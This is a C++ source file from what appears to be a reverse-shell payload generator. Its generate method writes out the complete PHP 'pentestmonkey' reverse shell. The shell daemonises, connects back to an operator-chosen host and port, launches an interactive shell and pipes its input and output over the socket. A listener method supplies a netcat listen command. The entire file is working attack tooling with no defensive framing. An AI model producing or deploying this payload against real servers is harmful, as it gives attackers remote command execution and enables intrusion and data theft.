#include "PHP_PentestMonkey_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>

std::string PHPPentestMonkeyPayload::name() const {
return "php_pentestmonkey";
}

std::string PHPPentestMonkeyPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "<?php\n\n"
       << "set_time_limit (0);\n"
       << "$VERSION = \"1.0\";\n"
       << "$ip = '" << opts.host << "';\n"
       << "$port = " << opts.port << ";\n"
       << "$chunk_size = 1400;\n"
       << "$write_a = null;\n"
       << "$error_a = null;\n"
       << "$shell = 'uname -a; w; id; " << opts.interpreter << " -i';\n"
       << "$daemon = 0;\n"
       << "$debug = 0;\n\n"
       << "if (function_exists('pcntl_fork')) {\n"
       << "	$pid = pcntl_fork();\n\n"
       << "	if ($pid == -1) {\n"
       << "		printit(\"ERROR: Can't fork\");\n"
       << "		exit(1);\n"
       << "	}\n\n"
       << "	if ($pid) {\n"
       << "		exit(0);\n"
       << "	}\n"
       << "	if (posix_setsid() == -1) {\n"
       << "		printit(\"Error: Can't setsid()\");\n"
       << "		exit(1);\n"
       << "	}\n\n"
       << "	$daemon = 1;\n"
       << "} else {\n"
       << "	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n"
       << "}\n\n"
       << "chdir(\"/\");\n\n"
       << "umask(0);\n\n"
       << "// Open reverse connection\n"
       << "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n"
       << "if (!$sock) {\n"
       << "	printit(\"$errstr ($errno)\");\n"
       << "	exit(1);\n"
       << "}\n\\n"
       << "$descriptorspec = array(\n"
       << "   0 => array(\"pipe\", \"r\"),\n"
       << "   1 => array(\"pipe\", \"w\"),\n"
       << "   2 => array(\"pipe\", \"w\")\n"
       << ");\n\n"
       << "$process = proc_open($shell, $descriptorspec, $pipes);\n\n"
       << "if (!is_resource($process)) {\n"
       << "	printit(\"ERROR: Can't spawn shell\");\n"
       << "	exit(1);\n"
       << "}\n\n"
       << "stream_set_blocking($pipes[0], 0);\n"
       << "stream_set_blocking($pipes[1], 0);\n"
       << "stream_set_blocking($pipes[2], 0);\n"
       << "stream_set_blocking($sock, 0);\n\n"
       << "printit(\"Successfully opened reverse shell to $ip:$port\");\n\n"
       << "while (1) {\n"
       << "	if (feof($sock)) {\n"
       << "		printit(\"ERROR: Shell connection terminated\");\n"
       << "		break;\n"
       << "	}\n\n"
       << "	if (feof($pipes[1])) {\n"
       << "		printit(\"ERROR: Shell process terminated\");\n"
       << "		break;\n"
       << "	}\n\n"
       << "	$read_a = array($sock, $pipes[1], $pipes[2]);\n"
       << "	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n"
       << "	if (in_array($sock, $read_a)) {\n"
       << "		if ($debug) printit(\"SOCK READ\");\n"
       << "		$input = fread($sock, $chunk_size);\n"
       << "		if ($debug) printit(\"SOCK: $input\");\n"
       << "		fwrite($pipes[0], $input);\n"
       << "	}\n\n"
       << "	if (in_array($pipes[1], $read_a)) {\n"
       << "		if ($debug) printit(\"STDOUT READ\");\n"
       << "		$input = fread($pipes[1], $chunk_size);\n"
       << "		if ($debug) printit(\"STDOUT: $input\");\n"
       << "		fwrite($sock, $input);\n"
       << "	}\n\n"
       << "	if (in_array($pipes[2], $read_a)) {\n"
       << "		if ($debug) printit(\"STDERR READ\");\n"
       << "		$input = fread($pipes[2], $chunk_size);\n"
       << "		if ($debug) printit(\"STDERR: $input\");\n"
       << "		fwrite($sock, $input);\n"
       << "	}\n"
       << "}\n\n"
       << "fclose($sock);\n"
       << "fclose($pipes[0]);\n"
       << "fclose($pipes[1]);\n"
       << "fclose($pipes[2]);\n"
       << "proc_close($process);\n\n"
       << "function printit ($string) {\n"
       << "	if (!$daemon) {\n"
       << "		print \"$string\\n\";\n"
       << "	}\n"
       << "}\n\n"
       << "?>\n";
    return ss.str();
}

std::string PHPPentestMonkeyPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}